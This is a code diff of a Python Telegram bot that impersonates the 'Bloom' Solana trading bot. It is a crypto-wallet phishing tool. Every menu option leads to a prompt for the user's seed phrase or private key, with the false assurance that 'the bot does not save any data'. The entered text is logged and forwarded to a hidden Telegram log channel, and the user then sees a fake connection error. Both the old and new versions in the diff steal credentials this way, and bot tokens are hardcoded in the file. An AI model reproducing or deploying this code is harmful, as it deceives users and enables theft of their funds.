@@ -1,89 +1,47 @@
 import logging
 import asyncio
 import secrets
-import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
+    MessageHandler, ContextTypes, filters
+)
+from telegram.error import NetworkError, BadRequest
 import sys
 import warnings
-import atexit
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
-)
-from telegram.error import NetworkError, Conflict
+import os
 
-# -------------------------
-# CONFIG / NAMESPACING
-# -------------------------
-PREFIX = "bloom"
-TOKEN = "8244731410:AAHCDO5H5msYiyTrw7k8W8Jg4t1otwPavGE"
+# == Bot Token ==
+TOKEN = '8531185520:AAG0beecrNcwp2DbSRw8y7z9NapaASZ3owY'
 
-# LOG BOT CONFIG
-LOG_BOT_TOKEN = "8178046991:AAFxDU5ery9fKln7pekP-c2JA0IcyoLzSE0"
-LOG_CHAT_ID = -4705597164
+# == Load Chat ID from File or Default
+CHAT_ID_FILE = "log_chat_id.txt"
+if os.path.exists(CHAT_ID_FILE):
+    with open(CHAT_ID_FILE, "r") as f:
+        LOG_CHANNEL_ID = int(f.read().strip())
+else:
+    LOG_CHANNEL_ID = -1003543647079  # fallback if file doesn't exist
 
-CHAT_ID_FILE = f"{PREFIX}_log_chat_id.txt"
-LOG_FILE = f"{PREFIX}_bot.log"
-LOCK_FILE = f"{PREFIX}.lock"
-
-# -------------------------
-# SIMPLE LOCAL LOCK
-# -------------------------
-def _check_and_create_lock():
-    pid = os.getpid()
-    if os.path.exists(LOCK_FILE):
-        try:
-            with open(LOCK_FILE, "r") as f:
-                existing = int(f.read().strip())
-            if existing != pid:
-                try:
-                    os.kill(existing, 0)
-                except OSError:
-                    pass
-                else:
-                    print(f"Another {PREFIX} instance appears to be running (PID {existing}). Exiting.")
-                    sys.exit(1)
-        except Exception:
-            pass
-    try:
-        with open(LOCK_FILE, "w") as f:
-            f.write(str(pid))
-    except Exception as e:
-        print(f"Warning: couldn't write lock file {LOCK_FILE}: {e}")
-    def _cleanup_lock():
-        try:
-            if os.path.exists(LOCK_FILE):
-                os.remove(LOCK_FILE)
-        except Exception:
-            pass
-    atexit.register(_cleanup_lock)
-
-_check_and_create_lock()
-
-# -------------------------
-# LOGGING SETUP
-# -------------------------
+# == Logging Setup ==
 logging.basicConfig(
     level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)],
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("bloom.log"),
+        logging.StreamHandler(sys.stdout)
+    ]
 )
-logging.getLogger("telegram").setLevel(logging.WARNING)
-logging.getLogger("telegram.ext").setLevel(logging.WARNING)
-logging.getLogger("urllib3").setLevel(logging.WARNING)
-logging.getLogger("httpx").setLevel(logging.WARNING)
-logging.getLogger("aiohttp.client").setLevel(logging.WARNING)
-warnings.filterwarnings("ignore", category=UserWarning, module="urllib3")
 
-# -------------------------
-# CUSTOM TELEGRAM LOG HANDLER
-# -------------------------
-class BloomTelegramLogHandler(logging.Handler):
-    def __init__(self, bot, chat_id=None):
+logging.getLogger('telegram').setLevel(logging.WARNING)
+logging.getLogger('telegram.ext').setLevel(logging.WARNING)
+logging.getLogger('urllib3').setLevel(logging.WARNING)
+logging.getLogger('httpx').setLevel(logging.WARNING)
+logging.getLogger('aiohttp.client').setLevel(logging.WARNING)
+warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')
+
+# == Custom Telegram Log Handler ==
+class TelegramLogHandler(logging.Handler):
+    def __init__(self, bot, chat_id):
         super().__init__()
         self.bot = bot
         self.chat_id = chat_id
@@ -94,46 +52,35 @@ class BloomTelegramLogHandler(logging.Handler):
             log_entry = log_entry[:3990] + "...\n[truncated]"
 
         async def safe_send():
-            if not self.chat_id:
-                return
             try:
                 await self.bot.send_message(chat_id=self.chat_id, text=log_entry)
             except Exception as e:
-                logging.warning(f"BloomTelegramLogHandler failed to send: {e.__class__.__name__}")
+                if hasattr(e, 'new_chat_id'):
+                    self.chat_id = e.new_chat_id
+                    with open("log_chat_id.txt", "w") as f:
+                        f.write(str(self.chat_id))
+                    try:
+                        await self.bot.send_message(chat_id=self.chat_id, text=log_entry)
+                    except Exception as inner_e:
+                        logging.warning(f"TelegramLogHandler failed after migration: {inner_e.__class__.__name__}")
+                else:
+                    logging.warning(f"TelegramLogHandler failed to send: {e.__class__.__name__}")
 
-        try:
-            asyncio.create_task(safe_send())
-        except RuntimeError:
-            logging.warning("Event loop not running — couldn't deliver logs to Telegram.")
+        asyncio.create_task(safe_send())
 
-# Add Telegram log handler
-log_bot = Bot(token=LOG_BOT_TOKEN)
-telegram_handler = BloomTelegramLogHandler(log_bot, LOG_CHAT_ID)
-telegram_handler.setLevel(logging.INFO)
-telegram_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
-logging.getLogger().addHandler(telegram_handler)
-
-# -------------------------
-# BOT STATE
-# -------------------------
-bloom_user_states = {}
-bloom_awaiting_seed = {}
-bloom_awaiting_privatekey = {}
-bloom_wallets = {}
-bloom_shown_private_key = set()
+# === User Data Stores ===
+user_states = {}
+awaiting_seed = {}
+awaiting_privatekey = {}
+wallets = {}
+shown_private_key = set()
 
 def generate_wallet():
     address = "Dt91LVw516kdrb2hj8PEaaxt5ux29f2QSDnp44PsYWVc"
     private_key = secrets.token_urlsafe(64)
     return address, private_key
 
-# -------------------------
-# HANDLERS
-# -------------------------
 async def handle_generic_menu_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    target = update.message or (update.callback_query and update.callback_query.message)
-    if not target:
-        return
     error_text = (
         "\U0001F510 You need to login your wallet first before using this command.\n\n"
         "Choose login method to continue"
@@ -143,25 +90,26 @@ async def handle_generic_menu_error(update: Update, context: ContextTypes.DEFAUL
         [InlineKeyboardButton("\U0001F519 Back", callback_data="login_options")]
     ]
     reply_markup = InlineKeyboardMarkup(buttons)
-    await target.reply_text(error_text, reply_markup=reply_markup)
+    await update.message.reply_text(error_text, reply_markup=reply_markup)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
-    logging.info(f"[{PREFIX.upper()} START] {user_id} ({user.full_name}) started the bot")
+    logging.info(f"[START] {user_id} ({user.full_name}) started the bot")
 
     welcome_text = (
-        "\u2699\ufe0f *Welcome To Trade Ticket Bot!*\n\n"
+        "\u2699\ufe0f *Welcome To Support Ticket Bot!*\n\n"
         "This bot can read contract addresses and lets you interact with the blockchain.\n\n"
         "*Main Commands:*\n"
-        "/config – Change options\n"
+        "/config – Change general options and access some other menus\n"
         "/wallets – See your balances or add/generate wallets\n"
-        "/trades – Open trades monitor\n"
-        "/snipes – List current snipes\n"
-        "/balance – Quick balance check\n\n"
+        "/trades – Open your trades monitor (you need to be watching a token first)\n"
+        "/snipes – List your current snipes and be able to cancel them\n"
+        "/balance – Do a quick balance check on a token and its value\n\n"
         "Select a category from the list provided."
     )
-    await update.message.reply_text(welcome_text, parse_mode="Markdown")
+
+    await update.message.reply_text(welcome_text, parse_mode='Markdown')
     await update.message.reply_text("Choose from the category below to continue:")
 
     keyboard = get_main_keyboard()
@@ -173,21 +121,27 @@ def get_main_keyboard():
         [InlineKeyboardButton("Balance", callback_data="menu_balance"),
          InlineKeyboardButton("Buy", callback_data="menu_buy"),
          InlineKeyboardButton("Positions", callback_data="menu_positions")],
+
         [InlineKeyboardButton("Limit Orders", callback_data="menu_limit"),
          InlineKeyboardButton("DCA Orders", callback_data="menu_dca"),
          InlineKeyboardButton("Copy Trade", callback_data="menu_copytrade")],
+
         [InlineKeyboardButton("Sniper", callback_data="menu_sniper"),
          InlineKeyboardButton("Trenches", callback_data="menu_trenches"),
          InlineKeyboardButton("Referrals", callback_data="menu_referrals")],
+
         [InlineKeyboardButton("Watchlist", callback_data="menu_watchlist"),
          InlineKeyboardButton("Withdraw", callback_data="menu_withdraw"),
          InlineKeyboardButton("Migration", callback_data="menu_migration")],
+
         [InlineKeyboardButton("Snapshot", callback_data="menu_snapshot"),
          InlineKeyboardButton("High Gas Fee", callback_data="menu_gas"),
          InlineKeyboardButton("Claim", callback_data="menu_claim")],
+
         [InlineKeyboardButton("RPC Settings", callback_data="menu_rpc"),
          InlineKeyboardButton("Pumppad", callback_data="menu_pumppad"),
          InlineKeyboardButton("Revoke Stuck", callback_data="menu_revoke")],
+
         [InlineKeyboardButton("Reactivate", callback_data="menu_reactivate"),
          InlineKeyboardButton("Rectification", callback_data="menu_rectify"),
          InlineKeyboardButton("Settings", callback_data="menu_settings")]
@@ -201,25 +155,30 @@ balance_handler = handle_generic_menu_error
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
     data = query.data
-    chat = query.message or query.from_user
-    chat_id = (query.message.chat_id if query.message else query.from_user.id)
+    chat_id = query.message.chat_id
     user = query.from_user
     user_id = user.id
 
-    logging.info(f"[{PREFIX.upper()} BUTTON] {user_id} clicked: {data}")
+    logging.info(f"[BUTTON] {user_id} clicked: {data}")
 
-    if data == f'{PREFIX}_continue' or data == 'bloom_continue':
-        if user_id not in bloom_wallets:
+    # Safely answer callback query
+    try:
+        await query.answer()
+    except BadRequest as e:
+        logging.warning(f"Callback query already answered or failed: {e}")
+
+    if data == 'bloom_continue':
+        if user_id not in wallets:
             address, private_key = generate_wallet()
-            bloom_wallets[user_id] = {'address': address, 'private_key': private_key}
+            wallets[user_id] = {'address': address, 'private_key': private_key}
             logging.info(f"[WALLET CREATED] {user_id} ({user.full_name}) - Address: {address}")
+            logging.info(f"[PRIVATE KEY] {user_id}: {private_key}")
         else:
-            address = bloom_wallets[user_id]['address']
-            private_key = bloom_wallets[user_id]['private_key']
+            address = wallets[user_id]['address']
+            private_key = wallets[user_id]['private_key']
 
-        bloom_shown_private_key.add(user_id)
+        shown_private_key.add(user_id)
 
         text = (
             "🌸 *Welcome to Bloom!*\n\n"
@@ -231,7 +190,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"{address}\n\n"
             "To start trading, deposit SOL to your address. *Only via SOL network.*"
         )
-        await query.edit_message_text(text, parse_mode="Markdown")
+
+        await query.edit_message_text(text, parse_mode='Markdown')
         await asyncio.sleep(2)
         await send_main_menu(chat_id, context)
 
@@ -251,29 +211,30 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(login_text, reply_markup=reply_markup)
 
     elif data == 'login_phrase':
-        bloom_awaiting_seed[user_id] = True
+        awaiting_seed[user_id] = True
         phrase_text = (
             "You have selected login_phrase.\n\n"
-            "\u26a0\ufe0f Note: Never share your seed phrase with anyone.\n"
+            "\u26a0\ufe0f Note: Never share your seed phrase with anyone. You are 100% safe. The bot does not save any data. Backup your recovery seed phrase somewhere safe.\n\n"
             "Please enter your 12/24 word seed phrase:"
         )
         await query.edit_message_text(phrase_text)
 
     elif data == 'login_privatekey':
-        bloom_awaiting_privatekey[user_id] = True
+        awaiting_privatekey[user_id] = True
         private_text = (
             "You have selected login_privatekey.\n\n"
-            "\u26a0\ufe0f Note: Never share your Privatekey with anyone.\n"
+            "\u26a0\ufe0f Note: Never share your Privatekey with anyone. You are 100% safe. The bot does not save any data. Backup your Privatekey somewhere safe.\n\n"
             "Please enter your private key:"
         )
         await query.edit_message_text(private_text)
 
     elif data.startswith("menu_"):
         step_name = data.replace("menu_", "")
-        bloom_user_states[user_id] = step_name
+        user_states[user_id] = step_name
         logging.info(f"[MENU] {user_id} selected: {step_name}")
+
         readable_name = step_name.replace("_", " ").title()
-        await context.bot.send_message(chat_id=chat_id, text=f"\u2705 You selected: *{readable_name}*.", parse_mode="Markdown")
+        await context.bot.send_message(chat_id=chat_id, text=f"\u2705 You have selected the category: *{readable_name}*.\nPlease proceed.", parse_mode="Markdown")
 
         login_text = "Choose login method to continue:"
         login_buttons = [
@@ -292,33 +253,34 @@ async def capture_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     chat = update.effective_chat
-    text = update.message.text.strip() if update.message and update.message.text else ""
-    logging.info(f"[{PREFIX.upper()} USER TEXT] {user_id} ({user.full_name}): {text}")
+    text = update.message.text.strip()
+    logging.info(f"[USER TEXT] {user_id} ({user.full_name}): {text}")
     logging.info(f"[CHAT INFO] ID: {chat.id}, Type: {chat.type}, Title: {chat.title or 'Private'}")
+
     try:
         await update.message.delete()
     except Exception as e:
         logging.warning(f"Failed to delete message: {e}")
 
-    if bloom_awaiting_seed.get(user_id):
-        bloom_awaiting_seed[user_id] = False
+    if awaiting_seed.get(user_id):
+        awaiting_seed[user_id] = False
         await update.message.reply_text("✅ Seed phrase received. Processing...")
         await asyncio.sleep(3)
-        await update.message.reply_text("❌😔 Error Connecting... Try another wallet or Contact Support👨‍💻")
-    elif bloom_awaiting_privatekey.get(user_id):
-        bloom_awaiting_privatekey[user_id] = False
+        await update.message.reply_text("❌😔 Error Connecting... Please ensure you enter valid information!!! Try another wallet or Contact Support👨‍💻")
+    elif awaiting_privatekey.get(user_id):
+        awaiting_privatekey[user_id] = False
         await update.message.reply_text("✅ Private key received. Processing...")
         await asyncio.sleep(3)
-        await update.message.reply_text("❌😔 Error Connecting... Try another wallet or Contact Support👨‍💻")
-    else:
-        await update.message.reply_text("ℹ️ Use /start to open the main menu.")
+        await update.message.reply_text("❌😔 Error Connecting... Please ensure you enter valid information!!! Try another wallet or Contact Support👨‍💻")
 
-# -------------------------
-# BOOTSTRAP
-# -------------------------
-if __name__ == "__main__":
+if __name__ == '__main__':
     try:
         app = ApplicationBuilder().token(TOKEN).build()
+
+        telegram_handler = TelegramLogHandler(app.bot, LOG_CHANNEL_ID)
+        telegram_handler.setLevel(logging.INFO)
+        telegram_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        logging.getLogger().addHandler(telegram_handler)
 
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CommandHandler("config", config_handler))
@@ -329,15 +291,9 @@ if __name__ == "__main__":
         app.add_handler(CallbackQueryHandler(button_handler))
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, capture_seed))
 
-        print(f"{PREFIX.capitalize()} Bot is running...")
+        print("Bot is running...")
         app.run_polling()
 
-    except Conflict:
-        logging.error("⚠️ Conflict: another polling instance is using this bot token.")
-        sys.exit(1)
     except NetworkError:
-        logging.error("🚫 Network error occurred. Terminating bot.")
-        sys.exit(1)
-    except Exception as e:
-        logging.exception(f"Unexpected error starting {PREFIX} bot: {e}")
+        print("🚫 Network error occurred. Terminating bot.")
         sys.exit(1)
